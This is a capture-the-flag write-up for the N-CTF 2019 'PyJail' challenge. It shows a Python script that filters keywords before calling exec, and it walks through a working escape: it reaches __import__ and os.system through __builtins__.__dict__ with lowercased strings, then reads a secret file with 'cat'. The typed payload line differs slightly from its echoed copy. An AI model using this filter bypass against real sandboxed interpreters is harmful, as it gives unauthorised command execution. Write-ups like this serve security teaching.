 N-CTF 2019.


PyJail

A glance at the source code and we can figure out what to do. We need to somehow exec a command of our choice beating the condition checks. The program checks for existence of eval, exec, import, open, os, read, system, write in our input. The challenge is to use python builtins to break out of this jail.

To start with lets read how python evaluates these statements. Example: if you write “import os” in a python script, python must be getting a function object “import” and passes it “os” as input and gets a class of “os” with the relevant methods.

Python allows us to use built in objects using the __builtins__ module. Lets check it out: https://docs.python.org/3/library/builtins.html

>>> dir(__builtins__)
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BufferError', 'BytesWarning', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'NameError', 'None', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'ReferenceError', 'RuntimeError', 'RuntimeWarning', 'StandardError', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '_', '__debug__', '__doc__', '__import__', '__name__', '__package__', 'abs', 'all', 'any', 'apply', 'basestring', 'bin', 'bool', 'buffer', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'cmp', 'coerce', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'execfile', 'exit', 'file', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'intern', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'long', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'raw_input', 'reduce', 'reload', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'unichr', 'unicode', 'vars', 'xrange', 'zip']
>>>
We can also convert this into a __dict__ representation.

>>> __builtins__.__dict__
{'bytearray': <type 'bytearray'>, 'IndexError': <type 'exceptions.IndexError'>, 'all': <built-in function all>, 'help': Type help() for interactive help, or help(object) for help about object., 'vars': <built-in function vars>, 'SyntaxError': <type 'exceptions.SyntaxError'>, 'unicode': <type 'unicode'>, 'UnicodeDecodeError': <type 'exceptions.UnicodeDecodeError'>, 'memoryview': <type 'memoryview'>, 'isinstance': <built-in function isinstance>, 'copyright': Copyright (c) 2001-2016 Python Software Foundation.
All Rights Reserved.
Copyright (c) 2000 BeOpen.com.
All Rights Reserved.
Copyright (c) 1995-2001 Corporation for National Research Initiatives.
All Rights Reserved.
Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.
All Rights Reserved., 'NameError': <type 'exceptions.NameError'>, 'BytesWarning': <type 'exceptions.BytesWarning'>, 'dict': <type 'dict'>, 'input': <built-in function input>, 'oct': <built-in function oct>, 'bin': <built-in function bin>, 'SystemExit': <type 'exceptions.SystemExit'>, 'StandardError': <type 'exceptions.StandardError'>, 'format': <built-in function format>, 'repr': <built-in function repr>, 'sorted': <built-in function sorted>, 'False': False, 'RuntimeWarning': <type 'exceptions.RuntimeWarning'>, 'list': <type 'list'>, 'iter': <built-in function iter>, 'reload': <built-in function reload>, 'Warning': <type 'exceptions.Warning'>, '__package__': None, 'round': <built-in function round>, 'dir': <built-in function dir>, 'cmp': <built-in function cmp>, 'set': <type 'set'>, 'bytes': <type 'str'>, 'reduce': <built-in function reduce>, 'intern': <built-in function intern>, 'issubclass': <built-in function issubclass>, 'Ellipsis': Ellipsis, 'EOFError': <type 'exceptions.EOFError'>, 'locals': <built-in function locals>, 'BufferError': <type 'exceptions.BufferError'>, 'slice': <type 'slice'>, 'FloatingPointError': <type 'exceptions.FloatingPointError'>, 'sum': <built-in function sum>, 'getattr': <built-in function getattr>, 'abs': <built-in function abs>, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'print': <built-in function print>, 'True': True, 'FutureWarning': <type 'exceptions.FutureWarning'>, 'ImportWarning': <type 'exceptions.ImportWarning'>, 'None': None, 'hash': <built-in function hash>, 'ReferenceError': <type 'exceptions.ReferenceError'>, 'len': <built-in function len>, 'credits':     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands
    for supporting Python development.  See www.python.org for more information., 'frozenset': <type 'frozenset'>, '__name__': '__builtin__', 'ord': <built-in function ord>, 'super': <type 'super'>, '_': None, 'TypeError': <type 'exceptions.TypeError'>, 'license': Type license() to see the full license text, 'KeyboardInterrupt': <type 'exceptions.KeyboardInterrupt'>, 'UserWarning': <type 'exceptions.UserWarning'>, 'filter': <built-in function filter>, 'range': <built-in function range>, 'staticmethod': <type 'staticmethod'>, 'SystemError': <type 'exceptions.SystemError'>, 'BaseException': <type 'exceptions.BaseException'>, 'pow': <built-in function pow>, 'RuntimeError': <type 'exceptions.RuntimeError'>, 'float': <type 'float'>, 'MemoryError': <type 'exceptions.MemoryError'>, 'StopIteration': <type 'exceptions.StopIteration'>, 'globals': <built-in function globals>, 'divmod': <built-in function divmod>, 'enumerate': <type 'enumerate'>, 'apply': <built-in function apply>, 'LookupError': <type 'exceptions.LookupError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'basestring': <type 'basestring'>, 'UnicodeError': <type 'exceptions.UnicodeError'>, 'zip': <built-in function zip>, 'hex': <built-in function hex>, 'long': <type 'long'>, 'next': <built-in function next>, 'ImportError': <type 'exceptions.ImportError'>, 'chr': <built-in function chr>, 'xrange': <type 'xrange'>, 'type': <type 'type'>, '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", 'Exception': <type 'exceptions.Exception'>, 'tuple': <type 'tuple'>, 'UnicodeTranslateError': <type 'exceptions.UnicodeTranslateError'>, 'reversed': <type 'reversed'>, 'UnicodeEncodeError': <type 'exceptions.UnicodeEncodeError'>, 'IOError': <type 'exceptions.IOError'>, 'hasattr': <built-in function hasattr>, 'delattr': <built-in function delattr>, 'setattr': <built-in function setattr>, 'raw_input': <built-in function raw_input>, 'SyntaxWarning': <type 'exceptions.SyntaxWarning'>, 'compile': <built-in function compile>, 'ArithmeticError': <type 'exceptions.ArithmeticError'>, 'str': <type 'str'>, 'property': <type 'property'>, 'GeneratorExit': <type 'exceptions.GeneratorExit'>, 'int': <type 'int'>, '__import__': <built-in function __import__>, 'KeyError': <type 'exceptions.KeyError'>, 'coerce': <built-in function coerce>, 'PendingDeprecationWarning': <type 'exceptions.PendingDeprecationWarning'>, 'file': <type 'file'>, 'EnvironmentError': <type 'exceptions.EnvironmentError'>, 'unichr': <built-in function unichr>, 'id': <built-in function id>, 'OSError': <type 'exceptions.OSError'>, 'DeprecationWarning': <type 'exceptions.DeprecationWarning'>, 'min': <built-in function min>, 'UnicodeWarning': <type 'exceptions.UnicodeWarning'>, 'execfile': <built-in function execfile>, 'any': <built-in function any>, 'complex': <type 'complex'>, 'bool': <type 'bool'>, 'ValueError': <type 'exceptions.ValueError'>, 'NotImplemented': NotImplemented, 'map': <built-in function map>, 'buffer': <type 'buffer'>, 'max': <built-in function max>, 'object': <type 'object'>, 'TabError': <type 'exceptions.TabError'>, 'callable': <built-in function callable>, 'ZeroDivisionError': <type 'exceptions.ZeroDivisionError'>, 'eval': <built-in function eval>, '__debug__': True, 'IndentationError': <type 'exceptions.IndentationError'>, 'AssertionError': <type 'exceptions.AssertionError'>, 'classmethod': <type 'classmethod'>, 'UnboundLocalError': <type 'exceptions.UnboundLocalError'>, 'NotImplementedError': <type 'exceptions.NotImplementedError'>, 'AttributeError': <type 'exceptions.AttributeError'>, 'OverflowError': <type 'exceptions.OverflowError'>}
>>>
Can access any such function using:

>>> __builtins__.__dict__['open']
<built-in function open>
Lets try to pass it to our jail.py:

>>> print(__builtins__.__dict__['open'])
print(__builtins__.__dict__['open'])
No!!!
lionaneesh@linux:~/ctfs$
Alright its obvious that the jail still matched our ‘open’ string. Well its pretty trivial to beat such a restriction now. We can do any sort of string operations on our input.

>>> print(__builtins__.__dict__['OPEN'.lower()])  
print(__builtins__.__dict__['OPEN'.lower()])
<built-in function open>
lionaneesh@linux:~/ctfs$
Voila. So that’s that. We have already defeated the purpose of those checks; we can do the same with import and run system inside the os’s module.

>>> __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower())
<module 'os' from '/usr/lib/python3.5/os.py'>
this gets us os module. We can follow the same technique again to run system inside that module to get RCE. For demonstration purposes I created a secret.txt file inside my directory.

lionaneesh@linux:~/ctfs$ python3 jail.py 
Hi! Welcome to pyjail!
========================================================================
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
    print("Hi! Welcome to pyjail!")
    print("========================================================================")
    print(open(__file__).read())
    print("========================================================================")
    print("RUN")
    text = input('>>> ')
    print(text)
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("No!!!")
            return;
    else:
        exec(text)
if __name__ == "__main__":
    main()
========================================================================
RUN
>>> __builtins__.____['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat secret.txt')
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat secret.txt')
THIS IS A SECRET FILE.
Hope you learned a thing or 2 about python builtins. Enjoy!
 